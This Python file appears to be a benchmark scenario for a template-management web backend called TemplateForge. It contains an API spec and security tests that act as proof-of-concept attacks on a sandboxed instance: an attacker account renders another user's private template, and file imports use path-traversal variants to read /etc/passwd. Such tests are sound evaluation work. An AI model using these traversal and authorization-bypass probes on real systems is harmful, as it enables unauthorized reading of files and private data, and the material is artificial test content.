    # 2) Register victim
    v_token, v_user, v_resp = register_user(app, "victim")
    if not v_token or not v_user:
        app.logger.error("Victim registration failed; cannot proceed.")
        return set()

    app.logger.info("Victim registered successfully.")

    # 3) Victim creates a private template containing the marker
    resp = create_template(app, v_token, tpl_name, tpl_content, public=False)
    if resp is None:
        app.logger.error("No response from POST /templates for victim.")
        return set()
    if resp.status_code != 201:
        app.logger.warning(
            "Victim template creation failed: status=%s", resp.status_code
        )
        return set()

    tpl_id = _safe_get_template_id(resp)
    if not tpl_id:
        app.logger.warning("Victim template creation returned no valid template ID.")
        return set()

    app.logger.info("Victim private template created (ID obtained).")

    # 4) Register attacker
    a_token, a_user, a_resp = register_user(app, "attacker")
    if not a_token or not a_user:
        app.logger.error("Attacker registration failed; cannot proceed.")
        return set()

    app.logger.info("Attacker registered successfully.")

    # 5) Exploit attempt: attacker renders victim's private template by ID
    out, status = _render_and_extract(app, a_token, tpl_id, {"foo": "X"})
    if status is None:
        app.logger.error("No response from render attempt.")
        return set()

    app.logger.info("Attacker render attempt completed with status=%s", status)

    # 6) Impact detection: success if response is 200 and contains the marker prefix
    # Avoid logging the output or marker
    if status == 200 and isinstance(out, str) and expected_prefix in out:
        app.logger.info(
            "Incorrect authorization confirmed: attacker rendered a private template not owned and not public."
        )
        findings.add(cwes.CWE.INCORRECT_AUTHORIZATION)
        return findings

    # Optional: Log expected secure behavior outcomes
    if status in (401, 403, 404):
        app.logger.info(
            "Render blocked as expected (status=%s). Backend may be secure for this path.",
            status,
        )
    else:
        app.logger.info(
            "Render did not demonstrate marker leakage; backend may not be vulnerable via this vector."
        )

    return findings


def sec_test_improper_input_validation(app: AppInstance) -> set[cwes.CWE] | None:
    findings: Set[cwes.CWE] = set()
    try:
        # 1) Prepare deterministic server-side file with a secret marker
        marker = generate_marker()
        abs_path = "/tmp/tf_leak_poc.txt"
        planted = f"PWN:{marker}:END"
        try:
            place_file_on_docker(app.container_id, abs_path, planted)
            app.logger.info(
                "Planted verification file inside container at %s", abs_path
            )
        except Exception as e:
            app.logger.exception("Failed to plant verification file: %s", e)
            # Even if planting fails, we can still try OS files like /etc/passwd
            # Continue execution.

        # 2) Register and obtain session token
        token, user_id, reg_resp = register_user(
            app, "tester_improper_input_validation"
        )
        if not token:
            app.logger.error("Unable to obtain session token; aborting test.")
            return findings  # empty set

        # 3) Try importing the planted file by absolute path
        success, _ = _try_import_and_verify(
            app,
            token,
            "imported-template-leak",
            abs_path,
            marker=marker,
            check_passwd=False,
        )
        if not success:
            app.logger.info(
                "Absolute path import did not reveal content; trying traversal variants."
            )
            # 4) Try traversal-based relative paths to reach the planted file
            for trav_path in _build_traversal_variants(abs_path, max_depth=8):
                success, _ = _try_import_and_verify(
                    app,
                    token,
                    "imported-template-leak-trav",
                    trav_path,
                    marker=marker,
                    check_passwd=False,
                )
                if success:
                    break

        # 5) If still not successful, try reading a benign system file to demonstrate arbitrary read
        if not success:
            etc_passwd = "/etc/passwd"
            app.logger.info("Attempting to import /etc/passwd via absolute path.")
            success, _ = _try_import_and_verify(
                app,
                token,
                "etc-passwd-import",
                etc_passwd,
                marker=None,
                check_passwd=True,
            )
            if not success:
                app.logger.info(
                    "Absolute /etc/passwd import failed; trying traversal variants."
                )
                for trav_path in _build_traversal_variants(etc_passwd, max_depth=8):
                    success, _ = _try_import_and_verify(
                        app,
                        token,
                        "etc-passwd-import-trav",
                        trav_path,
                        marker=None,
                        check_passwd=True,
                    )
                    if success:
                        break

        if success:
            app.logger.info(
                "CWE-20 PoC successful: improper validation of import path allows server-side file read."
            )
            findings.add(cwes.CWE.IMPROPER_INPUT_VALIDATION)
        else:
            app.logger.warning(
                "CWE-20 PoC unsuccessful: no evidence of improper path validation found."
            )

    except Exception as e:
        app.logger.exception(
            "Unexpected exception in sec_test_improper_input_validation: %s", e
        )

    return findings


def sec_test_improper_access_control(app: AppInstance) -> set[cwes.CWE] | None:
    vulns: set[cwes.CWE] = set()
    app.logger.info(
        "Starting CWE-284 PoC: Testing arbitrary server-side file read via /templates/import"
    )

    # 1) Register an attacker user to obtain a session token
    username = f"attacker_{uuid.uuid4().hex[:8]}"
    token, user_id, _ = register_user(app, username)
    if not token:
        app.logger.warning("Could not obtain session token; aborting PoC")
        return set()

    # 2) Prepare a deterministic file on the server with a unique marker in its content
    try:
        marker = generate_marker()
        # Use a constant filename so we never log the marker via the filename
        planted_filename = "poc_arbitrary_read.txt"
        planted_abs_path = f"{app.env.workdir.rstrip('/')}/{planted_filename}"
        place_file_on_docker(app.container_id, planted_abs_path, f"PWN:{marker}")
        app.logger.info("Planted test file in server workdir for verification purposes")
    except Exception as e:
        app.logger.exception("Failed to plant file in container: %s", e)
        return set()

    # 3) Attempt to import the planted file using multiple path variants
    # Absolute, relative, and traversal-based paths
    candidate_paths = [
        planted_abs_path,
        planted_filename,
        f"./{planted_filename}",
    ]
    # Add traversal variants that resolve to the absolute planted path
    candidate_paths.extend(_build_traversal_variants(planted_abs_path, max_depth=8))

    # Deduplicate while preserving order
    seen = set()
    unique_candidate_paths = []
    for p in candidate_paths:
        if p not in seen:
            unique_candidate_paths.append(p)
            seen.add(p)

    # Try to exploit via importing our planted file
    for path in unique_candidate_paths:
        ok, _ = _try_import_and_verify(
            app,
            token,
            name="poc-import",
            path=path,
            marker=marker,
            check_passwd=False,
        )
        if ok:
            app.logger.info(
                "Arbitrary file read confirmed using planted file via /templates/import"
            )
            vulns.add(cwes.CWE.IMPROPER_ACCESS_CONTROL)
            return vulns

    app.logger.info(
        "Planted-file import attempts did not conclusively prove arbitrary read; trying /etc/passwd"
    )

    # 4) Fallback: attempt to read /etc/passwd directly to demonstrate impact
    passwd_paths = ["/etc/passwd"]
    passwd_paths.extend(_build_traversal_variants("/etc/passwd", max_depth=8))

    seen = set()
    unique_passwd_paths = []
    for p in passwd_paths:
        if p not in seen:
            unique_passwd_paths.append(p)
            seen.add(p)

    for path in unique_passwd_paths:
        ok, _ = _try_import_and_verify(
            app,
            token,
            name="etc-passwd",
            path=path,
            marker=None,
            check_passwd=True,
        )
        if ok:
            app.logger.info(
                "Arbitrary file read confirmed via /templates/import by importing /etc/passwd"
            )
            vulns.add(cwes.CWE.IMPROPER_ACCESS_CONTROL)
            return vulns

    app.logger.warning(
        "CWE-284 PoC did not succeed; target may be patched or not vulnerable"
    )
    return set()


_API_SPEC = """
openapi: 3.0.3
info:
  title: TemplateForge
  description: TemplateForge is a web backend for managing and rendering user-defined text/HTML templates with variable substitution. Users register to obtain a session token, create templates, list/search their own or public templates, import templates from a server-side file path, and render templates with provided variables.
  version: 1.0.0
components:
  securitySchemes:
    SessionToken:
      type: apiKey
      in: header
      name: X-Session-Token
  schemas:
    Template:
      type: object
      properties:
        id:
          type: string
          example: "tpl_123"
        name:
          type: string
          example: "welcome-email"
        content:
          type: string
          example: "<h1>Hello {{name}}</h1>"
        public:
          type: boolean
          example: false
      required:
        - id
        - name
        - content
        - public
    TemplateSummary:
      type: object
      properties:
        id:
          type: string
          example: "tpl_123"
        name:
          type: string
          example: "welcome-email"
        public:
          type: boolean
          example: false
        owner:
          type: boolean
          description: True if the template is owned by the requesting user.
          example: true
      required:
        - id
        - name
        - public
        - owner
paths:
  /register:
    post:
      summary: Register a new user and obtain a session token
      requestBody:
        required: true
        content:
          application/json:
            schema:
              type: object
              properties:
                username:
                  type: string
                  example: "alice"
              required:
                - username
      responses:
        '201':
          description: User registered
          content:
            application/json:
              schema:
                type: object
                properties:
                  userId:
                    type: string
                    example: "usr_001"
                  sessionToken:
                    type: string
                    example: "st_abcdef123456"
                required:
                  - userId
                  - sessionToken
        '400':
          description: Invalid input
        '422':
          description: Unprocessable input
  /templates:
    post:
      summary: Create a new template
      security:
        - SessionToken: []
      requestBody:
        required: true
        content:
          application/json:
            schema:
              type: object
              properties:
                name:
                  type: string
                  example: "welcome-email"
                content:
                  type: string
                  description: Template content with placeholders like {{var}}
                  example: "<h1>Hello {{name}}</h1>"
                public:
                  type: boolean
                  default: false
              required:
                - name
                - content
      responses:
        '201':
          description: Template created
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/Template'
        '400':
          description: Invalid input
        '401':
          description: Unauthorized or missing session token
        '422':
          description: Unprocessable input
    get:
      summary: List/search templates (owned or public)
      security:
        - SessionToken: []
      parameters:
        - in: query
          name: q
          schema:
            type: string
          required: false
          description: Case-insensitive substring to match against template name
        - in: query
          name: scope
          schema:
            type: string
            enum: [all, own, public]
            default: all
          required: false
          description: Filter results by ownership or visibility
      responses:
        '200':
          description: List of matching templates
          content:
            application/json:
              schema:
                type: array
                items:
                  $ref: '#/components/schemas/TemplateSummary'
        '400':
          description: Invalid query parameters
        '401':
          description: Unauthorized or missing session token
        '422':
          description: Unprocessable input
  /templates/import:
    post:
      summary: Import a template from a server-side file path into the user's library
      security:
        - SessionToken: []
      requestBody:
        required: true
        content:
          application/json:
            schema:
              type: object
              properties:
                name:
                  type: string
                  example: "imported-template"
                path:
                  type: string
                  description: Absolute or application-relative server-side file path
                  example: "/srv/templates/welcome.html"
                public:
                  type: boolean
                  default: false
              required:
                - name
                - path
      responses:
        '201':
          description: Template imported
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/Template'
        '400':
          description: Invalid input
        '401':
          description: Unauthorized or missing session token
        '422':
          description: Unprocessable input
  /templates/{templateId}/render:
    post:
      summary: Render a template by supplying a variables map
      security:
        - SessionToken: []
      parameters:
        - in: path
          name: templateId
          schema:
            type: string
          required: true
          description: The ID of the template to render
      requestBody:
        required: true
        content:
          application/json:
            schema:
              type: object
              properties:
                variables:
                  type: object
                  additionalProperties:
                    oneOf:
                      - type: string
                      - type: number
                      - type: boolean
                  description: Key-value pairs to substitute into the template placeholders
              required:
                - variables
      responses:
        '200':
          description: Rendered output
          content:
            application/json:
              schema:
                type: object
                properties:
                  output:
                    type: string
                    example: "<h1>Hello Alice</h1>"
                required:
                  - output
            text/plain:
              schema:
                type: string
        '400':
          description: Invalid input
        '401':
          description: Unauthorized or missing session token
        '404':
          description: Template not found or not accessible
        '422':
          description: Unprocessable input
"""

_TEXT_SPEC = """
TemplateForge is a backend for managing and rendering user-defined text/HTML templates with variable substitution. Authentication for template operations uses an API key header named X-Session-Token.

The /register endpoint accepts HTTP POST to create a new user and return a session token. The request body must be a JSON object with a "username" string. On success, the server returns 201 with a JSON object containing "userId" and "sessionToken". Invalid or unprocessable input returns 400 or 422.

The /templates endpoint supports two operations:
- POST creates a new template for the authenticated user. The request requires the X-Session-Token header and a JSON body with "name" (string), "content" (string with placeholders like {{var}}), and optional "public" (boolean, default false). On success, returns 201 with the full Template object: "id" (string), "name" (string), "content" (string), and "public" (boolean). Errors include 400 (invalid input), 401 (missing/invalid session), and 422 (unprocessable input).
- GET lists or searches templates visible to the authenticated user. Requires X-Session-Token. Optional query parameters: "q" (string; case-insensitive substring match on name) and "scope" (one of all, own, public; default all). Returns 200 with an array of TemplateSummary objects, each containing "id" (string), "name" (string), "public" (boolean), and "owner" (boolean indicating if owned by the requester). Errors include 400, 401, and 422.

The /templates/import endpoint accepts HTTP POST to import a template from a server-side file path into the authenticated user’s library. Requires X-Session-Token and a JSON body with "name" (string), "path" (string; absolute or application-relative file path), and optional "public" (boolean, default false). On success, returns 201 with the Template object. Errors include 400, 401, and 422.

The /templates/{templateId}/render endpoint accepts HTTP POST to render a template by ID for the authenticated user. Requires X-Session-Token and a path parameter "templateId" (string). The JSON request body must include "variables", an object whose values may be string, number, or boolean, used to substitute into the template placeholders. On success, returns 200 either as application/json with {"output": string} or as text/plain with the rendered string. Errors include 400 (invalid input), 401 (unauthorized), 404 (template not found or not accessible), and 422 (unprocessable input).
"""

from scenarios.base import Scenario

SCENARIO = Scenario(
    id="""TemplateForge""",
    api_spec=_API_SPEC,
    text_spec=_TEXT_SPEC,
    short_app_description="""A web backend for managing and rendering user-defined text/HTML templates with variable substitution. Users register to obtain a session token, create templates with a name and content containing placeholders like {{var}}, list/search templates they own or that are marked public, import a template into their library from a server-side file path, and render a template by supplying a variables map to receive the filled output. Exactly five endpoints: register user, create template, list/search templates, import template from path, and render template.""",
    needs_db=True,
    needs_secret=False,
    scenario_instructions="""""",
    functional_tests=[
        func_test_create_list_render_single_user,
        func_test_visibility_across_users_scope_filtering,
        func_test_case_insensitive_search_q,
        func_test_import_template_from_path_and_list,
    ],
    security_tests=[
        sec_test_path_traversal,
        sec_test_os_injection,
        sec_test_xss,
        sec_test_code_injection,
        sec_test_incorrect_authorization,
        sec_test_improper_input_validation,
        sec_test_improper_access_control,
    ],
)
